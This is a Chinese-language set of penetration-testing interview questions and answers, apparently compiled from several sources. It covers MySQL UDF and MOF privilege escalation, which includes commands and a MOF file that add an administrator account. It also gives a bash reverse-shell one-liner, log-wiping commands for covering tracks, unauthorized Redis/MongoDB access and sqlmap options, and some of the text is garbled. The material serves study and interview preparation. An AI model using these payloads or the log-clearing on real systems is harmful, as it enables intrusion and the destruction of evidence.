    3. 有 root 账号密码 导出 udf: MYSQL 5.1 以上版本，必须要把 udf.dll ⽂件放到 MYSQL 安装⽬录下的 libplugin ⽂件夹下才能创建⾃定义函数 可以再 mysql ⾥输⼊` select @@basedir`

    ```
    show variables
    ```

    `like ‘%plugins%’ `寻找 mysql 安装路径 提权:

    使⽤ SQL 语句创建功能函数。语法：Create Function 函数名（函数名只能为下⾯列表中的其中之⼀）returns string soname ‘导出的 DLL 路径’；

    ```
    create function cmdshell returns string soname ‘udf.dll’
    select cmdshell(‘net user arsch arsch /add’);
    select cmdshell(‘net localgroup administrators arsch /add’);
    
    drop function cmdshell;
    ```

    该⽬录默认是不存在的，这就需要我们使⽤ webshell 找到 MYSQL 的安装⽬录，并在安装⽬录下创建 libplugin ⽂件夹，然后将 udf.dll ⽂件导出到该⽬录即可。

    **MySQL mof 提权**

    ```
    #pragma namespace("\\\\.\\root\\subscription")
    
    instance of __EventFilter as $EventFilter
    {
    EventNamespace = "Root\\Cimv2";
    Name = "filtP2";
    Query = "Select * From __InstanceModificationEvent "
    "Where TargetInstance Isa \"Win32_LocalTime\" "
    "And TargetInstance.Second = 5";
    QueryLanguage = "WQL";
    };
    
    instance of ActiveScriptEventConsumer as $Consumer
    {
    Name = "consPCSV2";
    ScriptingEngine = "JScript";
    ScriptText =
    "var WSH = new ActiveXObject(\"WScript.Shell\")WSH.run(\"net.exe user waitalone waitalone.cn /add\")";
    };
    
    instance of __FilterToConsumerBinding
    {
    Consumer = $Consumer;
    Filter = $EventFilter;
    };
    ```

    其中的第 18 ⾏的命令，上传前请⾃⼰更改。

    2、执⾏ load_fifile 及 into dumpfifile 把⽂件导出到正确的位置即可。

    ```
    select load file('c:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mov'
    ```

    执⾏成功后，即可添加⼀个普通⽤户，然后你可以更改命令，再上传导出执⾏把⽤户提升到管理员权限，然后 3389 连

    接之就 ok 了。

    ### ⼗⼋、特殊漏洞

    **1、Struts2-045**

    **2、Redis 未授权**

    **产⽣原因**

    Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公⽹上，如果在没有开启认证的情况下，可以导致任意⽤户在可以访问⽬标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利⽤ Redis 的相关⽅法，可以成功在 Redis 服务器上写⼊公钥，进⽽可以使⽤对应私钥直接登录⽬标服务器

    **利⽤条件和⽅法**

    条件:

    a、redis 服务以 root 账户运⾏

    b、redis ⽆密码或弱密码进⾏认证 c、redis 监听在 0.0.0.0 公⽹上

    ⽅法:

    a、通过 Redis 的 INFO 命令，可以查看服务器相关的参数和敏感信息，为攻击者的后续渗透做铺垫

    b、上传 SSH 公钥获得 SSH 登录权限

    c、通过 crontab 反弹 shell

    d、slave 主从模式利⽤

    **修复**

    密码验证

    降权运⾏

    限制 ip / 修改端⼝

    **3、Jenkins 未授权访问**

    **4、MongoDB 未授权访问**

    攻击者通过未授权访问进⼊脚本命令执⾏界⾯执⾏攻击指令

    println "ifconfig -a".execute ().text 执⾏⼀些系统命令，利⽤ wget 下载 webshell

    开启 MongoDB 服务时不添加任何参数时，默认是没有权限验证的，⽽且可以远程访问数据库，登录的⽤户可以通过默认

    端⼝⽆需密码对数据库进⾏增、删、改、查等任意⾼危操作。

    **防护**

    为 MongoDB 添加认证：

    1) MongoDB 启动时添加–auth 参数

    2) 给 MongoDB 添加⽤户：use admin #使⽤ admin 库 db.addUser (“root”, “123456”) #添加⽤户名 root 密码 123456 的⽤户 db.auth (“root”,“123456”) #验证下是否添加成功，返回 1 说明成功 2、禁⽤ HTTP 和 REST 端⼝ MongoDB ⾃身带有⼀个 HTTP 服务和并⽀持 REST 接⼝。在 2.6 以后这些接⼝默认是关闭的。mongoDB 默认会使⽤默认端⼝监听 web 服务，⼀般不需要通过 web ⽅式进⾏远程管理，建议禁⽤。修改配置⽂件或在启动的时候选择–nohttpinterface 参数 nohttpinterface=false 3、限制绑定 IP 启动时加⼊参数 –bind_ip 127.0.0.1 或在 /etc/mongodb.conf ⽂件中添加以下内容：bind_ip = 127.0.0.1

    **5、Memcache 未授权访问**

    Memcached 是⼀套常⽤的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公⽹开放的 Memcache 服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。

    **利⽤**

    a、登录机器执⾏ netstat -an |more 命令查看端⼝监听情况。回显 0.0.0.0:11211 表示在所有⽹卡进⾏监听，存在

    memcached 未授权访问漏洞。

    b、telnet 11211，或 nc -vv 11211，提示连接成功表示漏洞存在

    **漏洞加固**

    a、设置 memchached 只允许本地访问 b、禁⽌外⽹访问 Memcached 11211 端⼝ c、编译时加上–enable-sasl，启⽤

    SASL 认证

    **6、FFMPEG 本地⽂件读取**

    **原理**

    通过调⽤加密 API 将 payload 加密放⼊⼀个会被执⾏的段字节中。但是具体回答⼯程中我只回答道了 SSRF ⽼洞，

    m3u8 头，偏移量，加密。

    ### ⼗九、安全知识

    **1、WEB**

    **常⻅ WEB 开发 JAVA 框架**

    STRUTS,SPRING 常⻅的 java 框架漏洞 其实⾯试官问这个问题的时候我不太清楚他要问什么，我提到 struts 的 045048，java 常⻅反序列化。045 错误处理引⼊了 ognl 表达式 048 封装 action 的过程中有⼀步调⽤ getstackvalue 递归获取 ognl 表达式 反序列化 操作对象，通过⼿段引⼊。apache common 的反射机制、readobject 的重写，其实具体的 我也记不清楚。。。然后这部分就结束了

    **同源策略**

    同源策略限制不同源对当前 document 的属性内容进⾏读取或设置。不同源的区分：协议、域名、⼦域名、IP、端⼝，

    以上有不同时即不同源。

    **Jsonp 安全攻防技术，怎么写 Jsonp 的攻击⻚⾯**

    **涉及到 Jsonp 的安全攻防内容**

    JSON 劫持、Callback 可定义、JSONP 内容可定义、Content-type 不为 json。

    **攻击⻚⾯**

    JSON 劫持，跨域劫持敏感信息，⻚⾯类似于

    ```
    function wooyun(v){
    alert(v.username);
    }
     
     
    ```

    Content-type 不正确情况下，JSONP 和 Callback 内容可定义可造成 XSS。JSONP 和 FLASH 及其他的利⽤参照知道创宇的 JSONP 安全攻防技术。

    **2、PHP**

    **php 中命令执⾏涉及到的函数**

    **代码执⾏：**eval()、assert()、popen()、system()、exec()、shell_exec()、

    passthru (),pcntl_exec (),call_user_func_array (),create_function () ⽂件读取：fifile_get_contents (),highlight_fifile (),fopen (),read fifile (),fread (),fgetss (),

    fgets (),parse_ini_fifile (),show_source (),fifile () 等

    **命令执⾏：**system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()

    **安全模式下绕过 php 的 disable fuction**

    DL 函数，组件漏洞，环境变量。

    **PHP 弱类型**

    == 在进⾏⽐较的时候，会先将字符串类型转化成相同，再⽐较

    如果⽐较⼀个数字和字符串或者⽐较涉及到数字内容的字符串，则字符串会被转换成数值并且⽐较按照数值来进⾏

    0e 开头的字符串等于 0

    ### 3、数据库

    各种数据库⽂件存放的位置

    mysql:

    ```
    /usr/local/mysql/data/
    C:\ProgramData\MySQL\MySQL Server 5.6\Data\
    ```

    oracle: `$ORACLE_BASE/oradata/$ORACLE_SID/`

    ### 4、系统

    **如何清理⽇志如何清理⽇志**

    meterpreter: `clearev`

    **⼊侵 Linux 服务器后需要清除哪些⽇志？**

    web ⽇志，如 apache 的 access.log,error.log。直接将⽇志清除过于明显，⼀般使⽤ sed 进⾏定向清除

    e.g. sed -i -e ‘/192.169.1.1/d’

    history 命令的清除，也是对～/.bash_history 进⾏定向清除

    wtmp ⽇志的清除，/var/log/wtmp

    登录⽇志清除 /var/log/secure

    **LINUX**

    **查看当前端⼝连接的命令有哪些？netstat 和 ss 命令的区别和优缺点**

    ```
    netstat -antp` `ss -l
    ```

    ss 的优势在于它能够显示更多更详细的有关 TCP 和连接状态的信息，⽽且⽐ netstat 更快速更⾼效。

    **反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？**

    ```
    bash -i>&/dev/tcp/x.x.x.x/4444 0>&1
    ```

    **通过 Linux 系统的 /proc ⽬录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？**

    ```
    ls /proc
    ```

    系统信息，硬件信息，内核版本，加载的模块，进程

    **linux 系统中，检测哪些配置⽂件的配置项，能够提升 SSH 的安全性。**

    `/etc/ssh/sshd___config` iptables 配置

    如何⼀条命令查看⽂件内容最后⼀百⾏

    ```
    tail -n 100 filename
    ```

    **Windows**

    如何加固⼀个域环境下的 Windows 桌⾯⼯作环境？请给出你的思路。

    ### 5、密码学

    **AES／DES 的具体⼯作步骤**

    **RSA 算法**

    加密:

    密⽂＝明⽂ ^EmodN

    RSA 加密是对明⽂的 E 次⽅后除以 N 后求余数的过程

    公钥＝(E,N)

    解密:

    明⽂＝密⽂ ^DmodN 私钥＝(D,N)

    三个参数 n,e1,e2

    n 是两个⼤质数 p,q 的积

    **分组密码的加密模式**

    **如何⽣成⼀个安全的随机数？**

    引⽤之前⼀个学⻓的答案，可以通过⼀些物理系统⽣成随机数，如电压的波动、磁盘磁头读 / 写时的寻道时间、空中电磁波的噪声等。

    **SSL 握⼿过程**

    建⽴ TCP 连接、客户端发送 SSL 请求、服务端处理 SSL 请求、客户端发送公共密钥加密过的随机数据、服务端⽤私有

    密钥解密加密后的随机数据并协商暗号、服务端跟客户端利⽤暗号⽣成加密算法跟密钥 key、之后正常通信。这部分本

    来是忘了的，但是之前看 SSL Pinning 的时候好像记了张图在脑⼦⾥，挣扎半天还是没敢确定，遂放弃。。。

    **对称加密与⾮对称加密的不同，分别⽤在哪些⽅⾯**

    ### 6、TCP/IP

    **TCP 三次握⼿的过程以及对应的状态转换**

    （1）客户端向服务器端发送⼀个 SYN 包，包含客户端使⽤的端⼝号和初始序列号 x;

    （2）服务器端收到客户端发送来的 SYN 包后，向客户端发送⼀个 SYN 和 ACK 都置位的 TCP 报⽂，包含确认号 xx1

    和服务器端的初始序列号 y;

    （3）客户端收到服务器端返回的 SYNSACK 报⽂后，向服务器端返回⼀个确认号为 yy1、序号为 xx1 的 ACK 报⽂，⼀个标准的 TCP 连接完成。

    **TCP 和 UDP 协议区别**

    tcp ⾯向连接，udp ⾯向报⽂ tcp 对系统资源的要求多 udp 结构简单 tcp 保证数据完整性和顺序，udp 不保证

    **https 的建⽴过程**

    a、客户端发送请求到服务器端

    b、服务器端返回证书和公开密钥，公开密钥作为证书的⼀部分⽽存在

    c、客户端验证证书和公开密钥的有效性，如果有效，则⽣成共享密钥并使⽤公开密钥加密发送到服务器端

    d、服务器端使⽤私有密钥解密数据，并使⽤收到的共享密钥加密数据，发送到客户端

    e、客户端使⽤共享密钥解密数据

    f SSL 加密建⽴ f、SSL 加密建⽴

    ### 7、流量分析

    **wireshark 简单的过滤规则**

    **过滤 ip:**

    过滤源 ip 地址: ip.src==1.1.1.1; , ⽬的 ip 地址: ip.dst==1.1.1.1;

    **过滤端⼝:**

    过滤 80 端⼝: tcp.port==80 , 源端⼝: tcp.srcport==80 , ⽬的端⼝: tcp.dstport==80

    **协议过滤:**

    直接输⼊协议名即可，如 http 协议 https

    **http 模式过滤:**

    过滤 get/post 包 http.request.mothod=="GET/POST"

    ### 8、防⽕墙

    简述路由器交换机、防⽕墙等⽹络设备常⽤的⼏个基础配置加固项，以及配置⽅法。



## freebuf

### 2、whois查詢主要查的是什么?

```
1.域名信息

2.注册商

3.联系人

4.联系邮箱

5.网站创建时间

6.网站过期时间

7.DNS信息

8.网站状态

拓展：什么是whois？

whois可以理解为域名数据库搜索引擎
```

### 3、常用哪些查询网站

```
1.中国互联网信息中心whois查询

官网地址：http://www.cnnic.net.cn/

2.站长之家whois查询

官网地址：http://whois.chinaz.com/

3.站长工具whois查询

官网地址：http://tool.chinaz.com/ipwhois/

4.全球whois查询

官网地址：https://www.whois365.com/cn/

5.全球whois查询

官网地址：https://www.whois365.com/cn/

6.百度云whois查询

官网地址：https://cloud.baidu.com/product/bcd.html?track=cp:aladdin%7Ckw:148

7.新网whois查询

官网地址：http://whois.xinnet.com/domain/whois_login.jsp

8.时代互联

网址地址：http://www.now.cn/

9.alexa.cn whois查询

官网地址：http://whois.alexa.cn/

10.whoissoft.com

官网地址：http://whoissoft.com/

11.爱名网whois查询

官网地址：https://whois.22.cn/

12.网络工具大全

官网地址：http://tools.now.cn/

13.网站建设

官网地址：http://www.zw.cn/

14.中国万网whois

官网地址：http://whois.zw.cn/
```

4、给你个域名怎么知道ip地址？

```
1.最简单的用ping

2.nslookup+域名查看

3.利用站长之家等在线查询网站

4.云悉等指纹识别

5.ToolBox等浏览器插件
```

### 5、nmap扫描端口用什么命令?

```
-p 加端口号或1-65535

拓展：nmap端口扫描参数

-sS (TCP SYN扫描)

-sT (TCP connect()扫描)

-sU (UDP扫描)

-sV (版本探测)

-O (启用操作系统检测)

-f (报文分段); --mtu (使用指定的MTU)

-D <decoy1 ，decoy2，...> (使用诱饵隐蔽扫描)

-S <IP_Address> (源地址哄骗)
```

### 6、网站常见容器有哪些？

```
WebLogic

WebSphere

JBoss

Tomcat

IIS

Apache

Nginx
```

### 7、IIS常见漏洞

```
1.PUT漏洞

2.短文件名猜解

3.远程代码执行

4.解析漏洞
```

### 8、发现IIS的网站，怎样试它的漏洞？

```
区分版本

1.IIS6.0/7.5解析漏洞

2.IIS 7.5 NET源代码泄露和身份验证漏洞

3.IIS 7.5经典的ASP验证绕过

4.IIS 6.0安装PHP绕过认证漏洞
```

### 9、遇到WebLogic的网站容器，你会测什么漏洞？

```
weblogic反序列化漏洞
```

### 10、常测什么端口

```
443 网页浏览端口

445 共享文件夹

3306 mysql数据库

1443 mssql数据库

20 21 ftp

拓展：常见端口号

端口号    端口说明    				攻击技巧

21/22/69  ftp/tftp：文件传输协议    爆破\嗅探\溢出\后门

22    	  ssh：远程连接    			爆破OpenSSH；28个退格

23    	  telnet：远程连接    		爆破\嗅探

25    	  smtp：邮件服务    		邮件伪造

53   	  DNS：域名系统    			DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙

67/68     dhcp    					劫持\欺骗

110    	  pop3    					爆破

139    	  samba    					爆破\未授权访问\远程代码执行

143    	  imap    					爆破

161    	  snmp      				爆破

389       ldap    					注入攻击\未授权访问

512/513/514 linux r    				直接使用rlogin

873    	  rsync    					未授权访问

1080    socket    					爆破：进行内网渗透

1352    lotus    					爆破：弱口令\信息泄漏：源代码

1433    mssql    					爆破：使用系统用户登录\注入攻击

1521    oracle    					爆破：TNS\注入攻击

2049    nfs    						配置不当

2181    zookeeper    				未授权访问

3306    mysql    					爆破\拒绝服务\注入

3389    rdp    						爆破\Shift后门

4848    glassfish    				爆破：控制台弱口令\认证绕过

5000    sybase/DB2    				爆破\注入

5432    postgresql    				缓冲区溢出\注入攻击\爆破：弱口令

5632    pcanywhere    				拒绝服务\代码执行

5900    vnc    						爆破：弱口令\认证绕过

6379    redis    					未授权访问\爆破：弱口令

7001    weblogic    				Java反序列化\控制台弱口令\控制台部署webshell

80/443/8080    web    				常见web攻击\控制台爆破\对应服务器版本漏洞

8069    zabbix    					远程命令执行

9090    websphere控制台    			爆破：控制台弱口令\Java反序列

9200/9300 elasticsearch    			远程代码执行

11211    memcacache    				未授权访问

27017    mongodb    				爆破\未授权访问
```

### 11、内网扫描到445端口测什么漏洞？

```
永恒之蓝ms17-010
```

### 12、内网如何实现跨域？

```
1.jsonp跨域		

利用了 script 不受同源策略的限制

缺点：只能 get 方式，易受到 XSS攻击

2.CORS跨域		

当使用XMLHttpRequest发送请求时，如果浏览器发现违反了同源策略就会自动加上一个请求头 origin；

后端在接受到请求后确定响应后会在后端在接受到请求后确定响应后会在 Response Headers 中加入一个属性 Access-Control-Allow-Origin；

浏览器判断响应中的 Access-Control-Allow-Origin 值是否和当前的地址相同，匹配成功后才继续响应处理，否则报错

缺点：忽略 cookie，浏览器版本有一定要求

3.代理跨域请求

前端向发送请求，经过代理，请求需要的服务器资源

缺点：需要额外的代理服务器

4.Html5 postMessage 方法

允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本、多窗口、跨域消息传递

缺点：浏览器版本要求，部分浏览器要配置放开跨域限制

5.修改 document.domain 跨子域

相同主域名下的不同子域名资源，设置 document.domain 为 相同的一级域名

缺点：同一一级域名；相同协议；相同端口

6.基于 Html5 websocket 协议

websocket 是 Html5 一种新的协议，基于该协议可以做到浏览器与服务器全双工通信，允许跨域请求

缺点：浏览器一定版本要求，服务器需要支持 websocket 协议

7.document.xxx + iframe

通过 iframe 是浏览器非同源标签，加载内容中转，传到当前页面的属性中

缺点：页面的属性值有大小限制
```

### 13、用什么方法实现反向代理？

```
EarthWorm

reGeorg-master

Tunna-master

proxifier
```

### 14、外网渗透会用到哪些工具？

```
Metasploit

SQLmap

Nmap

BeEF

Social Engineer Toolkit(SET)

Wireshark

w3af

CORE Impact

OWASP ZAP

Canvas

Aircrack-ng

Burp Suite

Hydra

John the Ripper

AWVS

御剑
```

### 15、sqlmap盲注用什么参数？

```
-technique
拓展：sql注入工具sqlmap使用参数说明

Options（选项）：

--version 显示程序的版本号并退出

-h, --help 显示此帮助消息并退出

-v VERBOSE 详细级别：0-6（默认为1）

Target（目标）：以下至少需要设置其中一个选项，设置目标URL。

-d DIRECT 直接连接到数据库。

-u URL, --url=URL 目标URL。

-l LIST 从Burp或WebScarab代理的日志中解析目标。

-r REQUESTFILE 从一个文件中载入HTTP请求。

-g GOOGLEDORK 处理Google dork的结果作为目标URL。

-c CONFIGFILE 从INI配置文件中加载选项。

Request（请求）：:这些选项可以用来指定如何连接到目标URL。

--data=DATA 通过POST发送的数据字符串

--cookie=COOKIE HTTP Cookie头

--cookie-urlencode URL 编码生成的cookie注入

--drop-set-cookie 忽略响应的Set - Cookie头信息

--user-agent=AGENT 指定 HTTP User - Agent头

--random-agent 使用随机选定的HTTP User - Agent头

--referer=REFERER 指定 HTTP Referer头

--headers=HEADERS 换行分开，加入其他的HTTP头

--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)

--auth-cred=ACRED HTTP身份验证凭据（用户名:密码）

--auth-cert=ACERT HTTP认证证书（key_file，cert_file）

--proxy=PROXY 使用HTTP代理连接到目标URL

--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）

--ignore-proxy 忽略系统默认的HTTP代理

--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒

--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）

--retries=RETRIES 连接超时后重新连接的时间（默认3）

--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式

--safe-url=SAFURL 在测试过程中经常访问的url地址

--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL

Optimization（优化）：这些选项可用于优化SqlMap的性能。

-o 开启所有优化开关

--predict-output 预测常见的查询输出

--keep-alive 使用持久的HTTP（S）连接

--null-connection 从没有实际的HTTP响应体中检索页面长度

--threads=THREADS 最大的HTTP（S）请求并发量（默认为1）

Injection（注入）：这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。

-p TESTPARAMETER 可测试的参数（S）

--dbms=DBMS 强制后端的DBMS为此值

--os=OS 强制后端的DBMS操作系统为这个值

--prefix=PREFIX 注入payload字符串前缀

--suffix=SUFFIX 注入payload字符串后缀

--tamper=TAMPER 使用给定的脚本（S）篡改注入数据

Detection（检测）：

这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。

--level=LEVEL 执行测试的等级（1-5，默认为1）

--risk=RISK 执行测试的风险（0-3，默认为1）

--string=STRING 查询时有效时在页面匹配字符串

--regexp=REGEXP 查询时有效时在页面匹配正则表达式

--text-only 仅基于在文本内容比较网页

Techniques（技巧）：这些选项可用于调整具体的SQL注入测试。

--technique=TECH SQL注入技术测试（默认BEUST）

--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）

--union-cols=UCOLS 定列范围用于测试UNION查询注入

--union-char=UCHAR 用于暴力猜解列数的字符

Fingerprint（指纹）：

-f, --fingerprint 执行检查广泛的DBMS版本指纹

Enumeration（枚举）：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。

-b, --banner 检索数据库管理系统的标识

--current-user 检索数据库管理系统当前用户

--current-db 检索数据库管理系统当前数据库

--is-dba 检测DBMS当前用户是否DBA

--users 枚举数据库管理系统用户

--passwords 枚举数据库管理系统用户密码哈希

--privileges 枚举数据库管理系统用户的权限

--roles 枚举数据库管理系统用户的角色

--dbs 枚举数据库管理系统数据库

--tables 枚举的DBMS数据库中的表

--columns 枚举DBMS数据库表列

--dump 转储数据库管理系统的数据库中的表项

--dump-all 转储所有的DBMS数据库表中的条目

--search 搜索列（S），表（S）和/或数据库名称（S）

-D DB 要进行枚举的数据库名

-T TBL 要进行枚举的数据库表

-C COL 要进行枚举的数据库列

-U USER 用来进行枚举的数据库用户

--exclude-sysdbs 枚举表时排除系统数据库

--start=LIMITSTART 第一个查询输出进入检索

--stop=LIMITSTOP 最后查询的输出进入检索

--first=FIRSTCHAR 第一个查询输出字的字符检索

--last=LASTCHAR 最后查询的输出字字符检索

--sql-query=QUERY 要执行的SQL语句

--sql-shell 提示交互式SQL的shell

Brute force（蛮力）：这些选项可以被用来运行蛮力检查。

--common-tables 检查存在共同表

--common-columns 检查存在共同列

User-defined function injection（用户自定义函数注入）：这些选项可以用来创建用户自定义函数。

--udf-inject 注入用户自定义函数

--shared-lib=SHLIB 共享库的本地路径

File system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。

--file-read=RFILE 从后端的数据库管理系统文件系统读取文件

--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件

--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径

Operating system access（操作系统访问）：这些选项可以用于访问后端数据库管理系统的底层操作系统。

--os-cmd=OSCMD 执行操作系统命令

--os-shell 交互式的操作系统的shell

--os-pwn 获取一个OOB shell，meterpreter或VNC

--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC

--os-bof 存储过程缓冲区溢出利用

--priv-esc 数据库进程用户权限提升

--msf-path=MSFPATH Metasploit Framework本地的安装路径

--tmp-path=TMPPATH 远程临时文件目录的绝对路径

Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。

--reg-read 读一个Windows注册表项值--reg-add 写一个Windows注册表项值数据

--reg-del 删除Windows注册表键值

--reg-key=REGKEY Windows注册表键

--reg-value=REGVAL Windows注册表项值

--reg-data=REGDATA Windows注册表键值数据

--reg-type=REGTYPE Windows注册表项值类型

General（一般）：

这些选项可以用来设置一些一般的工作参数。

-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中

-s SESSIONFILE 保存和恢复检索会话文件的所有数据

--flush-session 刷新当前目标的会话文件

--fresh-queries 忽略在会话文件中存储的查询结果

--eta 显示每个输出的预计到达时间

--update 更新SqlMap

--save file保存选项到INI配置文件

--batch 从不询问用户输入，使用所有默认配置。

Miscellaneous（杂项）：

--beep 发现SQL注入时提醒

--check-payload IDS对注入payloads的检测测试

--cleanup SqlMap具体的UDF和表清理DBMS

--forms 对目标URL的解析和测试形式

--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果

--page-rank Google dork结果显示网页排名（PR）

--parse-errors 从响应页面解析数据库管理系统的错误消息

--replicate 复制转储的数据到一个sqlite3数据库

--tor 使用默认的Tor（Vidalia/ Privoxy
```

### 16、Burp Suite重放包怎么做？

```
发送到Repeater
```

### 17、对POST请求用户名密码爆破发送到哪里？

```
发送到Intruder
```

### 18、越权漏洞有了解么

```
水平越权:

也可以把其称作访问控制攻击漏洞.Web应用程序在接收到用户的请求时，我们在增删改查某条数据时候，没有判断数据所对应的用户，

或者在判断数据的用户时是通过从用户表单参数中获取userid来实现的，这里的话我们可以修改userid来实现水平越权。

垂直越权：

垂直越权又叫做权限提升攻击，具体原因就是web应用没有做用户权限控制，或者只是在菜单上做了权限控制，

导致恶意用户只要猜测到其他管理页面的URL，就可以访问或者控制其他角色拥有的数据或者页面，达到权限提升的目的。
```

### 19、有哪些上传绕过的方式？

```
1.客户端js验证

2.服务器端验证

3.  配合文件包含漏洞

4.  配合服务器解析漏洞绕过

5.  配合操作系统文件命令规则

6.  CMS、编辑器漏洞

7.  配合其他规则

8.  WAF绕过

9.  文件后缀名绕过

10. 文件内容头校验（gif89a）

11. 文件头content-type字段校验（image/gif）
```

### 20、window的安全日志在哪里？

```
电脑桌面右键单击此电脑，选中管理，进入管理界面，点击事件查看器，接着展开windows日志选项，windows日志界面点击安全选项卡，进入安全日志列表，可以记录所有电脑安全审核动作
```

### 21、linux中怎么查看系统日志

```
在/var/log中
```

### 22、如何查看被入侵后敲过的命令？

```
History
```

## 其他一些面试问题

> 1 linux 添加 删除 修改 复制一个文件
>
> 2 windows linux 最高权限是什么
>
> 3 路由器和交换机有什么区别 （自我介绍说成网络工程师了。。）
>
> 4 windows 域 和 域控
>
> 5 sql注入的危害 和 如何修复
>
> 6 sql注入如何拿到shell
>
> 7 什么是xss
>
> 8 文件上传漏洞 文件上传到哪了
>
> 9 文件上传漏洞 怎么拿到shell
>
> 10 使用脏牛时 把服务器系统搞蓝屏了怎么办
>
> 11除了教学的方式 还有哪些获取知识的方式
>
> 12经过这段时间的学习 你今后对哪些方向感兴趣
>
> 13擅长的技能 未来的意向
>
> 14 csrf与xss区别
>
> 15 linux 查找文件
>
> 16 除了教学的方式 还有哪些获取知识的方式
>
> 17语言接触过哪些?
>
> 18扫过什么网站
>
> 19给你个靶机能按照文档否找出靶机漏洞
>
> 20在助学基地学习了什么？
>
> 21你有系统学习网络安全方面的知识吗？
>
> 22什么叫全双工，什么叫半双工？
>
> 23学过什么渗透工具？
>
> 24御剑的主要功能？
>
> 25 bp爆破模块？
>
> 26爆破四种模式？简述过程
>
> 27 sql注入类型？
>
> 28抓包怎么区分包头，包体，正文？
>
> 29 sqlmap -u -r 区别
>
> 30 python和php能用到什么程度
>
> 31三次握手
>
> 32自己怎么挖掘到的漏洞，具体的步骤
>
> 33 linux的日志文件在哪里
>
> 34 怎么linux查看进程
>
> 35 拿到shell以后 3389没有打开，不能直接用命令打开3389，怎么远程连接
>
> 36 给你一个网站 ，你应该做些什么
>
> 37 linux怎么查看今天创建过什么历史文件
>
> 38 流量监控 是怎么监控的
>
> 39 kali的 ms17010
>
> 40 sql注入 说一下怎么查看数据库
>
> 41 sql注入除了手动 还有什么方法查看sql注入
>
> 42 sql注入怎么绕过waf的语句
>
> 43 sql的注入经常使用什么手法



**为何一个 MYSQL 数据库的站，只有一个 80 端口开放?**

　　**答：**更改了端口，没有扫描出来;站库分离;3306 端口不对外开放。

[![渗透测试初级面试题](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/tongyong16.jpg)](https://tb.53kf.com/code/client/10132404/14)

　　**2. 一个成熟并且相对安全的 CMS，渗透时扫目录的意义?**

　　**答：**敏感文件、二级目录扫描;站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点。

　　**3. 在某后台新闻编辑界面看到编辑器，应该先做什么?**

　　**答：**查看编辑器的名称版本，然后搜索公开的漏洞。

　　**4. 审查上传点的元素有什么意义?**

　　**答：**有些站点的上传文件类型限制是在前端实现的，这时只要增加上传类型就能

　　突破限制了。

　　**5. CSRF、XSS 及 XXE 有什么区别，以及修复方式?**

　　**答：**xSS 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用 HTTP Only 来禁 JavaScript 读取 Cookie 值、输入时校验、浏览器与 Web 应用端采用相同的字符编码。

　　CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范 CSRF 的页面然后嵌入Token、再次输入密码、检验 Referer。

　　XXE 是 XML 外部实体注入攻击，XML 中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML 解析库在调用时严格禁止对外部实体的解析。

　　**6. 3389 无法连接的几种情况**

　　**答：**没开放 3389 端口;端口被修改;防护拦截;处于内网(需进行端口转发)

　　**7. 列举出 owasp top10 2019**

　　**答：**1)注入;2)失效的身份认证;3)敏感信息泄露;4)XML 外部实体(XXE);5)失效的访问控制;6)安全配置错误;7)跨站脚本(XSS);8)不安全的反序列化;9)使用含有已知漏洞的组件;10)不足的日志记录和监控。

　　**8. 说出至少三种业务逻辑漏洞，以及修复方式?**

　　**答：**密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码;身份认证漏洞中最常见的是会话固定攻击和 Cookie 仿冒，只要得到 Session 或 Cookie 即可伪造用户身份;验证码漏洞中存在验证码允许暴力破解、验证码可以通过 Javascript 或者改包的方法来进行绕过。

　　**9. 目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403，什么原因?**

　　**答：**原因很多，有可能 Web 服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过。

　　**10. 目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用?**

　　**答：**先爆破用户名，再利用被爆破出来的用户名爆破密码;其实有些站点，在登陆处也会这样提示;所有和数据库有交互的地方都有可能有注入。



3、一个成熟且相对安全的CMS，渗透时扫目录的意义?

　　敏感文件、二级目录扫描，站长的误操作等，比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点。

　　4、甲给你一个目标站，且告诉你根目录下存在/abc/目录，且此目录下存在编辑器和admin目录，你有什么想法?

